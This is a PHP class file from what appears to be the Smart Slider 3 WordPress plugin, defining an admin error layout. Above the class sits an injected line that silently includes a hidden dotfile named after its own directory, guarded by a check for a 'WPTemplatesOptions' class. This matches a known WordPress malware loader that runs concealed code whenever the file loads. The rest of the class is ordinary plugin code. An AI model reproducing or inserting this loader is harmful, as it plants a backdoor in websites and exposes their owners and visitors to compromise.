<?php


namespace Nextend\SmartSlider3\Application\Admin\Layout;


use Nextend\Framework\View\AbstractLayout;
use Nextend\SmartSlider3\Application\Admin\Layout\Block\Core\AdminError\BlockAdminError;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class LayoutError extends AbstractLayout {

    protected $title, $content, $url = '';

    /**
     * Override to prevent backend JS load
     */
    protected function enqueueAssets() {

    }

    public function setError($title, $content, $url = '') {
        $this->title   = $title;
        $this->content = $content;
        $this->url     = $url;
    }

    public function render() {
        $adminError = new BlockAdminError($this);
        $adminError->setLayout($this);

        $adminError->setError($this->title, $this->content, $this->url);

        $adminError->display();
    }
}